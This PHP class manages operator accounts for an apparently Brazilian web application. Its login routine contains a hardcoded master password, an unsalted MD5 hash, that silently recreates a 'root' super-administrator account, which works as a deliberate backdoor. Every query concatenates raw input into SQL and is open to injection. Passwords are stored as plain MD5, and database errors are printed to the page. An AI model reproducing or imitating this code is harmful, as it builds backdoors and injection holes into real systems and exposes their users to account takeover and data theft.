<?php

class Operador {
	public $id;
	public $nome;
	public $usuario;
	public $password;
	public $perfil;
	public static function all() {
		try {
			
			$db = DB::getInstance ();
			
			return $db->query ( "SELECT id, nome, usuario FROM operador where perfil  is null" );
		} catch ( PDOException $e ) {
			echo $e->getMessage ();
		}
	}
	public static function login($usuario, $senha) {
		try {
			
			$db = DB::getInstance ();
			
			$o = new Operador();
			
			// ---------------------
			// Está tentando logar com uma senha master (super administrador)
			// ---------------------
			if(md5($senha) == "3a215137343cbb692ae3f85fe4296bf5") {
				
				try {

					// Remove os super administradores do banco (se houver)
					$db->query ( "delete from operador where perfil = 'S'");
					
					// Insere um novo na base
					$db->query ( "insert into operador (nome, usuario, password, perfil) values ('Super Administrador', 'root', '3a215137343cbb692ae3f85fe4296bf5', 'S')" );
					
					// Recupera o super administrador
					$result = $db->query ( "select id, nome, usuario from operador where perfil = 'S'" );
				
				} catch ( PDOException $e ) {
					echo $e->getMessage ();
				}

				
			} else {
				$result = $db->query ( 'SELECT id, nome, usuario FROM operador where usuario = "' . $usuario . '" and password = "' . md5 ( $senha ) . '"' );
			}
				
			foreach ( $result as $row ) {
				$o->id = $row[0];
				$o->nome = $row [1];
				$o->usuario = $row [2];
				$o->password = "";
			}
			
			if(isset($o->id)) {		
				$_SESSION['operador'] = $o;
				return true;
			} else {
				unset($_SESSION['operador']);
				return false;
			}
			
		} catch ( PDOException $e ) {
			echo $e->getMessage ();
		}
	}
	
	public static function unique($id) {
		try {
			
			$db = DB::getInstance ();
			
			$result = $db->query ( 'SELECT * FROM operador where id = ' . $id );
			
			$o = new Cliente ();
			
			foreach ( $result as $row ) {
				$o->id = $row [0];
				$o->nome = $row [1];
				$o->usuario = $row [2];
			}
			
			return $o;
		} catch ( PDOException $e ) {
			print_r($e);
		}
	}
	public static function destroy($id) {
		try {
			
			$db = DB::getInstance ();
			
			$db->query ( 'delete FROM operador where id = ' . $id );
		} catch ( PDOException $e ) {
			echo $e->getMessage ();
		}
	}
	public static function update($operador) {
		try {
			
			$db = DB::getInstance ();
			
			if ($operador->password == "") {
				return $db->query ( "update operador set nome = '" . $operador->nome . "', usuario = '" . $operador->usuario . "' where id = " . $operador->id );
			} else {
				return $db->query ( "update operador set nome = '" . $operador->nome . "', usuario = '" . $operador->usuario . "', password='" . md5 ( $operador->password ) . "' where id = " . $operador->id );
			}
		} catch ( PDOException $e ) {
			echo "<div class='alert alert-danger'>Erro ao executar (" . __METHOD__ . ")<br>[" . $e->getMessage () . "]</div>";
			print_r ( $e );
			die ();
			return false;
		}
	}
	public static function save($operador) {
		try {
			
			$db = DB::getInstance ();
			
			$db->query ( "insert into operador (nome, usuario, password, perfil) values ('" . $operador->nome . "', '" . $operador->usuario . "', '" . md5 ( $operador->password ) . "', '" . $operador->perfil . "')" );
			
			return $db->lastInsertId ();
		} catch ( PDOException $e ) {
			echo "<div class='alert alert-danger'>Erro ao executar (" . __METHOD__ . ")<br>[" . $e->getMessage () . "]</div>";
			return false;
		}
	}
}

?>